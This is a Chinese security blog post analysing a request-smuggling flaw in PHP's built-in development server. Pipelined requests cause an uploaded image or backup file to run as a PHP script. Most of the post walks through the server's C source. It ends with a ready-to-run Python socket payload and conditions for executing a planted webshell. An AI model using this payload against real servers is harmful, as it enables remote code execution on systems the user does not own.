#  【漏洞情报】从php Zend 内核层分析PHP built-in server http请求走私漏洞  
原创 隼目安全
                        隼目安全  隼目安全   2026-02-01 21:14  
  
> ❝  
> 由于传播、利用本公众号"隼目安全"所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号"隼目安全"及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa78yBmqxSSrHCWpia77CRScTjricYicRkT9JHwIm6SsX7EEBERNyvwY6x6w/640?wx_fmt=jpeg&from=appmsg "")  
  
扫描上方二维码即可加入“重庆_网安一家亲”微信群（仅限重庆地区）  
## PHP built-in server http请求走私漏洞  
### 漏洞演示  
  
先给大家演示一下该漏洞的效果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7D6llOagUuDGUKOJiaaoW5pnX2A0TPDanYT3icgWl6LtpVd7vpMobtp5w/640?wx_fmt=png&from=appmsg "")  
  
当前目录下，只有一个图片文件，但是图片文件中的是php代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7TccnGQaiaiaAtXMoj5HkIy1ZsDsDbGKdP6piamdiaffvvLORcNqHCvv58Q/640?wx_fmt=png&from=appmsg "")  
  
我在此目录下启动php服务  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7fzGxibfX3VUzsmqyciasIcC1y5cC7Bia7HWiaaeVhfb6pyuAGdlOu9kUzA/640?wx_fmt=png&from=appmsg "")  
  
正常访问该图片，就是我刚刚展示的php代码内容，并且没有被我提前包含和其他任何操作  
  
在我发送payload之后，你会发现，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7U8YYT0SibX26U4iaFltKGa5feQ5coh5IRsTYDoZUQqibibXHYuVbYOK4icA/640?wx_fmt=png&from=appmsg "")  
  
这里面的php代码被执行了  
### Zend内核层原理深入剖析  
  
php源码下载  
```
https://www.php.net/distributions/php-7.3.4.tar.gz  https://www.php.net/distributions/php-7.3.4.tar.bz2  \# 64位 NTS编译好的二进制文件  https://windows.php.net/downloads/releases/archives/php-7.3.4-nts-Win32-VC15-x64.zip  
```  
#### 漏洞描述  
  
PHP Built-in Server 在处理 HTTP 请求时，使用了基于回调的事件驱动解析器php_http_parser。当解析器在单次调用中接收到多个连续的 HTTP 请求时，会依次触发各个请求的回调函数。 由于回调函数对php_cli_server_request结构体的字段进行直接覆盖，而没有正确的边界检查，导致：  
```
第一个请求的 path_translated + 第二个请求的 ext = 类型混淆  
```  
  
最终，一个扩展名为 .xxx(任意三字后缀，例如.png .jpg .bak .gif .zip .rar .wav等等) 的备份文件会因为扩展名被错误地更新为 .php，而被 PHP 解释器当作脚本执行。  
  
示意图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7fGT4mmtiaibR8S5s4PXoRiaL1TkBIKoZeyh7YLsCeiajUIkK312YJq6oFw/640?wx_fmt=png&from=appmsg "")  
#### 漏洞分析  
##### 核心结构  
  
**请求结构体定义**  
  
文件位置: sapi/cli/php_cli_server：php_cli_server_request  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7AEUnjBvM1lNAR68GSGnvRAetorI18ExPbXJlwgtjiapb0ibMc0RKqerQ/640?wx_fmt=png&from=appmsg "")  
```
typedef struct php_cli_server_request {  enum php_http_method request_method; // GET, POST, etc.  int protocol_version; // HTTP版本号  <br/>char \*request_uri; // 原始URI  size_t request_uri_len;  <br/>char \*vpath; // 虚拟路径（从URL解析）  size_t vpath_len;  <br/>char \*path_translated; // 文件系统路径  size_t path_translated_len; // 实际执行的文件  <br/>char \*path_info; // PATH_INFO  size_t path_info_len;  <br/>char \*query_string; // 查询字符串  size_t query_string_len;  <br/>HashTable headers; // HTTP头部  HashTable headers_original_case;  <br/>char \*content; // POST数据  size_t content_len;  <br/>const char \*ext; // 扩展名指针  size_t ext_len; // 指向vpath内部！  <br/>zend_stat_t sb; // 文件状态  } php_cli_server_request;  
```  
  
字段说明  
  
1. ext 是一个指针，指向 vpath 字符串的某个位置  
  
2. 当 vpath 被释放并重新分配时，ext 会变成悬空指针  
  
3. path_translated 是独立分配的，只有文件存在时才会更新  
  
**客户端**  
  
文件: sapi/cli/php_cli_server.c：php_cli_server_request  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7se6UkWI5wRdL2SicO7FFGciaMopLDT0WaNWWNRS1nFHM7npvEvn5SKeg/640?wx_fmt=png&from=appmsg "")  
```
typedef struct php_cli_server_client {  struct php_cli_server \*server;  php_socket_t sock;  struct sockaddr \*addr;  socklen_t addr_len;  char \*addr_str;  size_t addr_str_len;  php_http_parser parser;  unsigned int request_read:1;  char \*current_header_name;  size_t current_header_name_len;  unsigned int current_header_name_allocated:1;  char \*current_header_value;  size_t current_header_value_len;  enum { HEADER_NONE=0, HEADER_FIELD, HEADER_VALUE } last_header_element;  size_t post_read_offset;  php_cli_server_request request;  unsigned int content_sender_initialized:1;  php_cli_server_content_sender content_sender;  int file_fd;  } php_cli_server_client;  
```  
  
问题所在：request 是一个共享的单例对象，多个 HTTP 请求会反复修改同一个 request 结构以及没有针对管道化请求的隔离机制  
  
内存状态变化总结  
```
┌─────────────────────────────────────────────────────────┐  │ php_cli_server_client (客户端结构) │  ├─────────────────────────────────────────────────────────┤  │ parser: \[状态机\] │  │ request_read: 0 → 1 (第一个请求完成后) │  │ request: ───────┐ │  └──────────────────┼───────────────────────────────────────┘  │  ▼  ┌─────────────────────────────────────────────────────────┐  │ php_cli_server_request (请求对象) │  ├─────────────────────────────────────────────────────────┤  │ │  │ 第一个请求完成时： │  │ ┌────────────────────────────────────────────┐ │  │ │ vpath: 0x001000 → "s3Cr37_f1L3.php.bak" │ │  │ │ └──┐ │ │  │ │ ext: 0x001012 ──────────────┘ ("bak") │ │  │ │ ext_len: 3 │ │  │ │ │ │  │ │ path_translated: 0x002000 → │ │  │ │ "/var/www/s3Cr37_f1L3.php.bak" │ │  │ └────────────────────────────────────────────┘ │  │ │  │ 第二个请求的 on_path() 调用后： │  │ ┌────────────────────────────────────────────┐ │  │ │ vpath: 0x001000 → "phantom.php" (覆盖) │ │  │ │ └──┐ │ │  │ │ ext: 0x001012 ─────┐ │ (悬空指针！) │ │  │ │ ▼ ▼ │ │  │ │ (指向已释放的内存或垃圾数据) │ │  │ │ │ │  │ │ path_translated: 0x002000 → (未改变!) │ │  │ │ "/var/www/s3Cr37_f1L3.php.bak" │ │  │ └────────────────────────────────────────────┘ │  │ │  │ 第二个请求的 on_message_complete() 调用后： │  │ ┌────────────────────────────────────────────┐ │  │ │ vpath: 0x001000 → "phantom.php" │ │  │ │ └──┐ │ │  │ │ ext: 0x001008 ────────┘ ("php") │ │  │ │ ext_len: 3 │ │  │ │ │ │  │ │ path_translated: 0x002000 → (仍未改变!) │ │  │ │ "/var/www/s3Cr37_f1L3.php.bak" │ │  │ │ │ │  │ │ 类型混淆状态 │ │  │ └────────────────────────────────────────────┘ │  └─────────────────────────────────────────────────────────┘  
```  
  
**请求读取入口**  
  
文件: sapi/cli/php_cli_server.c：php_cli_server_client_read_request  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7xibgpPzFUZVIlWBdcjMphk2NpRCJpfic60NSSIhPAXJygJRbuQSWP4yw/640?wx_fmt=png&from=appmsg "")  
```
static int php_cli_server_client_read_request(  php_cli_server_client \*client,  char \*\*errstr)  {  char buf\[16384\]; // 16KB缓冲区，可容纳多个请求  <br/>static const php_http_parser_settings settings = {  php_cli_server_client_read_request_on_message_begin,  php_cli_server_client_read_request_on_path, // ！  php_cli_server_client_read_request_on_query_string,  php_cli_server_client_read_request_on_url,  php_cli_server_client_read_request_on_fragment,  php_cli_server_client_read_request_on_header_field,  php_cli_server_client_read_request_on_header_value,  php_cli_server_client_read_request_on_headers_complete,  php_cli_server_client_read_request_on_body,  php_cli_server_client_read_request_on_message_complete // ！  };  <br/>size_t nbytes_consumed;  int nbytes_read;  <br/>// 【检查点1】: 如果已读取完成，直接返回  if (client->request_read) {  return 1; // ！ 只在函数入口检查一次  }  <br/>// 【关键操作】: 从socket读取数据  // 如果客户端发送了多个请求，可能一次性读入buf  nbytes_read = recv(client->sock, buf, sizeof(buf) - 1, 0);  if (nbytes_read < 0) {  // 错误处理...  int err = php_socket_errno();  if (err == SOCK_EAGAIN) {  return 0;  }  \*errstr = php_socket_strerror(err, NULL, 0);  return -1;  } elseif (nbytes_read == 0) {  \*errstr = estrdup(php_cli_server_request_error_unexpected_eof);  return -1;  }  <br/>client->parser.data = client;  <br/>// 【漏洞触发点】: 调用HTTP解析器  // 这个函数会解析buf中的所有完整请求  // 每解析完一个请求，都会调用on_message_complete  nbytes_consumed = php_http_parser_execute(&client->parser,  &settings,  buf,  nbytes_read);  <br/>if (nbytes_consumed != (size_t)nbytes_read) {  // 解析错误...  if (buf\[0\] & 0x80 || buf\[0\] == 0x16) {  \*errstr = estrdup("Unsupported SSL request");  } else {  \*errstr = estrdup("Malformed HTTP request");  }  return -1;  }  <br/>// 处理当前header...  if (client->current_header_name) {  char \*header_name = safe_pemalloc(  client->current_header_name_len, 1, 1, 1);  memmove(header_name, client->current_header_name,  client->current_header_name_len);  client->current_header_name = header_name;  client->current_header_name_allocated = 1;  }  <br/>return client->request_read ? 1 : 0;  }  
```  
  
问题分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7DyWASib1VwB6ibZ0WxeFhVO8ibbdPz2QzqSoGdFKvficrefsria01nkjakw/640?wx_fmt=png&from=appmsg "")  
  
这个检查只在函数入口执行一次，并且无法阻止 php_http_parser_execute() 内部解析多个请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7OibYVLz03rxYicGTiaibkKhs72DEib0d2k5uGTARLhvs4HVaibQ2OkR5EROw/640?wx_fmt=png&from=appmsg "")  
  
解析器会处理 buf 中的所有完整请求  
  
每遇到 \r\n\r\n（请求结束标记），就触发 on_message_complete  
  
**路径回调**  
  
文件: sapi/cli/php_cli_server.c：php_cli_server_client_read_request_on_path  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7USbDU3jTgdaXQTNMWazc4u3uJS4ZlOMia7M8KmNhp6C7jfOGniczKPaw/640?wx_fmt=png&from=appmsg "")  
```
static int php_cli_server_client_read_request_on_path(  php_http_parser \*parser,  const char \*at, // 指向解析缓冲区中的路径字符串  size_t length) // 路径长度  {  php_cli_server_client \*client = parser->data;  {  char \*vpath;  size_t vpath_len;  <br/>// 规范化虚拟路径（处理URL编码、相对路径等）  normalize_vpath(&vpath, &vpath_len, at, length, 1);  <br/>// 漏洞点: 无条件覆盖  // 问题1: 没有检查client->request_read标志  // 问题2: 直接覆盖指针，导致ext成为悬空指针  // 问题3: 没有释放旧的vpath内存（normalize_vpath内部会处理）  client->request.vpath = vpath;  client->request.vpath_len = vpath_len;  }  return 0;  }  
```  
  
**路径翻译函数**  
  
文件: sapi/cli/php_cli_server.c：php_cli_server_request_translate_vpath  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa72Fia8m78rQdXKwBfnFsc1ugI0flBSrQHNwo46gn7Pbg3ExmcWgP0AdA/640?wx_fmt=png&from=appmsg "")  
  
这个函数有一百多行，就简化逻辑展示了，感兴趣的师傅可以自己去阅读源码  
```
static void php_cli_server_request_translate_vpath(  php_cli_server_request \*request,  const char \*document_root,  size_t document_root_len)  {  zend_stat_t sb;  static const char \*index_files\[\] = { "index.php", "index.html", NULL };  <br/>// 分配缓冲区并构建完整路径  char \*buf = safe_pemalloc(1, request->vpath_len,  1 + document_root_len + 1 + sizeof("index.html"), 1);  char \*p = buf, \*prev_path = NULL, \*q, \*vpath;  size_t prev_path_len = 0;  int is_static_file = 0;  <br/>// 拼接路径: document_root + vpath  memmove(p, document_root, document_root_len);  p += document_root_len;  vpath = p;  <br/>if (request->vpath_len > 0 && request->vpath\[0\] != '/') {  \*p++ = DEFAULT_SLASH;  }  <br/>// 检查vpath中是否包含'.'（判断是否为静态文件）  q = request->vpath + request->vpath_len;  while (q > request->vpath) {  if (\*q-- == '.') {  is_static_file = 1;  break;  }  }  <br/>memmove(p, request->vpath, request->vpath_len);  <br/>#ifdef PHP_WIN32  // Windows: 转换路径分隔符  q = p + request->vpath_len;  do {  if (\*q == '/') {  \*q = '\\\\';  }  } while (q-- > p);  #endif  <br/>p += request->vpath_len;  \*p = '\\0';  q = p;  <br/>// 【关键循环】: 尝试stat文件  while (q > buf) {  // 尝试stat文件  if (!php_sys_stat(buf, &sb)) {  // 文件存在  if (sb.st_mode & S_IFDIR) {  // 如果是目录，尝试查找index文件  const char \*\*file = index_files;  if (q\[-1\] != DEFAULT_SLASH) {  \*q++ = DEFAULT_SLASH;  }  while (\*file) {  size_t l = strlen(\*file);  memmove(q, \*file, l + 1);  if (!php_sys_stat(buf, &sb) && (sb.st_mode & S_IFREG)) {  q += l;  break;  }  file++;  }  if (!\*file || is_static_file) {  // 没找到索引文件或是静态文件  if (prev_path) {  pefree(prev_path, 1);  }  pefree(buf, 1);  // 【关键点】: 直接返回，不设置path_translated  return;  }  }  // 找到普通文件，跳出循环  break;  }  <br/>// 【关键点】: 文件不存在的处理  // 如果文件不存在，这里会尝试去掉最后一个路径组件  // 但对于简单的文件名（如phantom.php），会直接跳出while循环  // 然后在函数末尾，如果sb未被设置（文件不存在），  // path_translated可能不会被更新  <br/>if (prev_path) {  pefree(prev_path, 1);  \*q = DEFAULT_SLASH;  }  while (q > buf && \*(--q) != DEFAULT_SLASH);  prev_path_len = p - q;  prev_path = pestrndup(q, prev_path_len, 1);  \*q = '\\0';  }  <br/>// 设置path_info和path_translated  if (prev_path) {  request->path_info_len = prev_path_len;  #ifdef PHP_WIN32  while (prev_path_len--) {  if (prev_path\[prev_path_len\] == '\\\\') {  prev_path\[prev_path_len\] = '/';  }  }  #endif  request->path_info = prev_path;  pefree(request->vpath, 1);  request->vpath = pestrndup(vpath, q - vpath, 1);  request->vpath_len = q - vpath;  request->path_translated = buf;  request->path_translated_len = q - buf;  } else {  pefree(request->vpath, 1);  request->vpath = pestrndup(vpath, q - vpath, 1);  request->vpath_len = q - vpath;  <br/>// 这里设置path_translated  // 但如果上面的stat失败了，可能buf指向的是document_root  // 或者根本没有执行到这里（提前return了）  request->path_translated = buf;  request->path_translated_len = q - buf;  }  <br/>#ifdef PHP_WIN32  // 规范化vpath  {  uint32_t i = 0;  for (; i &lt; request-&gt;vpath_len; i++) {  if (request->vpath\[i\] == '\\\\') {  request->vpath\[i\] = '/';  }  }  }  #endif  <br/>request->sb = sb;  }  
```  
  
如果第二个请求的文件（phantom.php）不存在，函数会直接 return，不修改 path_translated，因此导致 path_translated 保持为第一个请求的值  
  
**拓展名获取**  
  
文件: sapi/cli/php_cli_server.c：php_cli_server_client_read_request_on_message_complete  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7tviat5F0AMfZeUkgbL4ia3EcoQILpICTfcyNs1koO8IrxdoNocSUPA4A/640?wx_fmt=png&from=appmsg "")  
```
static int php_cli_server_client_read_request_on_message_complete(php_http_parser \*parser)  {  php_cli_server_client \*client = parser->data;  // 设置协议版本  client->request.protocol_version = parser->http_major \* 100 + parser->http_minor;  // 翻译虚拟路径为文件系统路径  php_cli_server_request_translate_vpath(&client->request, client->server->document_root, client->server->document_root_len);  // 提取文件扩展名  {  const char \*vpath = client->request.vpath, \*end = vpath + client->request.vpath_len, \*p = end;  client->request.ext = end;  // 默认设置：无扩展名  client->request.ext_len = 0;  // 从后向前查找最后一个'.'while (p > vpath) {  \--p;  if (\*p == '.') {  ++p;  // 设置ext指针指向vpath内部  // 问题: ext是一个普通指针，直接指向vpath的某个位置  // 当vpath被释放或重新分配时，ext会成为悬空指针  client->request.ext = p;  client->request.ext_len = end - p;  break;  }  }  }  // 标记请求已读取  // 问题: 这个标志的设置"太晚"了  // 解析器在同一次php_http_parser_execute调用中，  // 还会继续处理buffer中的剩余数据（第二个请求）  client->request_read = 1;  return 0;  }  
```  
  
执行流程  
```
第一个请求完成时:  ┌──────────────────────────────────┐  │ vpath = "s3Cr37_f1L3.php.bak" │ (地址: 0x1000)  │ │ │  │ ▼ │  │ ext 指向 vpath\[18\] = "bak" │ (地址: 0x1012)  │ ext_len = 3 │  └──────────────────────────────────┘  <br/>第二个请求的on_path调用后:  ┌──────────────────────────────────┐  │ 旧vpath被释放: 0x1000 │  │ 新vpath分配: "phantom.php" │ (地址: 可能是0x1000或其他)  │ │  │ ext = 0x1012 悬空指针! │  └──────────────────────────────────┘  <br/>第二个请求的on_message_complete调用后:  ┌──────────────────────────────────┐  │ vpath = "phantom.php" │ (地址: 0x1000)  │ │ │  │ ▼ │  │ ext 指向 vpath\[8\] = "php" │ (地址: 0x1008)  │ ext_len = 3 │  └──────────────────────────────────┘  
```  
  
分发判断  
  
文件: sapi/cli/php_cli_server.c：php_cli_server_dispatch  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7ibdyVeRfSBGPiadiafx1m12HrCQkKRBjbTnSOOcQIbjBoVqBCaiaickbCtg/640?wx_fmt=png&from=appmsg "")  
```
static int php_cli_server_dispatch(php_cli_server \*server, php_cli_server_client \*client) /\* {{{ \*/  {  int is_static_file = 0;  <br/>SG(server_context) = client;  // 通过ext和path_translated来判断文件类型  if (client->request.ext_len != 3 || memcmp(client->request.ext, "php", 3) || !client->request.path_translated) {  // 条件1: 扩展名长度| 条件2: 扩展名内容 | 条件3: 路径有效性  is_static_file = 1;  }  // 如果有路由器或不是静态文件，初始化PHP请求  if (server->router || !is_static_file) {  if (FAILURE == php_cli_server_request_startup(server, client)) {  SG(server_context) = NULL;  php_cli_server_close_connection(server, client);  destroy_request_info(&SG(request_info));  return SUCCESS;  }  }  // 如果配置了路由器脚本，先执行  if (server->router) {  if (!php_cli_server_dispatch_router(server, client)) {  php_cli_server_request_shutdown(server, client);  return SUCCESS;  }  }  // 根据is_static_file标志决定处理方式  if (!is_static_file) {  // 当作PHP脚本执行  // 使用path_translated作为脚本路径  if (SUCCESS == php_cli_server_dispatch_script(server, client)  || SUCCESS != php_cli_server_send_error_page(server, client, 500)) {  if (SG(sapi_headers).http_response_code == 304) {  SG(sapi_headers).send_default_content_type = 0;  }  php_cli_server_request_shutdown(server, client);  return SUCCESS;  }  } else {  // 当作静态文件处理  if (server->router) {  static int (\*send_header_func)(sapi_headers_struct \*);  send_header_func = sapi_module.send_headers;  /\* do not generate default content type header \*/  SG(sapi_headers).send_default_content_type = 0;  /\* we don't want headers to be sent \*/  sapi_module.send_headers = sapi_cli_server_discard_headers;  php_request_shutdown(0);  sapi_module.send_headers = send_header_func;  SG(sapi_headers).send_default_content_type = 1;  SG(rfc1867_uploaded_files) = NULL;  }  if (SUCCESS != php_cli_server_begin_send_static(server, client)) {  php_cli_server_close_connection(server, client);  }  SG(server_context) = NULL;  return SUCCESS;  }  <br/>SG(server_context) = NULL;  destroy_request_info(&SG(request_info));  return SUCCESS;  }  
```  
  
攻击者发送两个连续请求（如 GET /shell.jpg  
 紧接 GET /phantom.php  
）  
  
利用 PHP Built-in Server  
 在 php_http_parser_execute()  
 单次调用中处理多请求时的状态分裂缺陷：第一个请求让 translate_vpath() (line 1350)  
 检测到 shell.jpg  
 存在后设置 path_translated = "/path/to/shell.jpg"  
；第二个请求因 phantom.php  
 不存在导致 translate_vpath()  
 在 line 1448  
 提前返回而不更新 path_translated  
，但 extract_extension() (line 1696)  
 仍从新的 vpath  
 提取并更新 ext = "php"  
；  
  
最终 dispatch() (line 2141)  
 在 line 2301   
检查 if (ext_len != 3 || memcmp(ext, "php", 3) || !path_translated)  
时发现三个条件全部不满足（ext_len=3 且 ext="php" 且 path_translated 非空）  
，导致is_static_file = 0  
，服务器误判将 path_translated  
 指向的 .jpg  
 静态文件当作PHP脚本执行——关键在于第一个文件（任意三字符后缀的后门文件，必须存在）的处理方式由第二个文件（.php 结尾，不需要存在）的扩展名决定，当第二个请求的 ext被识别为 "php" 时，is_static_file  
 被设为 0，触发 php_cli_server_dispatch_script()  
 将第一个请求的静态文件作为 PHP 代码执行。  
### 影响范围  
#### 版本  
  
PHP<= 7 . 4 . 21  
#### 利用条件  
1. 目标使用 php -S 启动的内置服务器  
  
1. web目录可上传，或者存在任意三字符后缀的webshell文件  
  
### 利用payload  
  
在python的终端中输入  
```
import socket  p=b"GET /test.jpg HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\nPOST /x.php HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: 0\\r\\n\\r\\n"  s=socket.socket()  s.connect(("127.0.0.1",8888))  s.send(p)  print(s.recv(4096).decode())
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7HibdiasoAoFtflj2R5ibDBmmZTgIGlnZtGspsNySaBlwSKYSa2f1smjFQ/640?wx_fmt=jpeg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/9HKdHo8BvC1ovYBMyMMiac7FkT1H4DWa7wPzQD3C8TwLBPVA4HEt8u1LlvKOdfctzwFk9E8cYia6n62s9LbQicyzg/640?wx_fmt=gif "")  
  
  
往期推荐  
  
  
  
[重庆_网安一家亲](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491178&idx=1&sn=7afc0c5d45dcd9b1902d1e2c685f2dea&scene=21#wechat_redirect)  
  
  
[【漏洞情报】【0day】织梦DedeCMS 0click劫持导致的前台rce getshell](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491168&idx=1&sn=a0f8e643b67f1dc879b9c4d3adbc85a0&scene=21#wechat_redirect)  
  
  
[【转载】复盘2025：在WAF的缝隙里开出花来（附EDU通杀0DayPOC）](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491127&idx=1&sn=6e297c23bf014488296c0418d96a2597&scene=21#wechat_redirect)  
  
  
[【相关分享】PHP反序列化的万字简单总结](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491088&idx=1&sn=61317dd03dca9a48967b9a44c6413813&scene=21#wechat_redirect)  
  
  
[快手牛逼](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247490390&idx=1&sn=5599b8baf91ff693e5c05974ee6f9594&scene=21#wechat_redirect)  
  
  
  
文稿 |   
Ph@nt0m  
  
制作 | Xuan8a1  
  
审发 | 隼目安全  
  
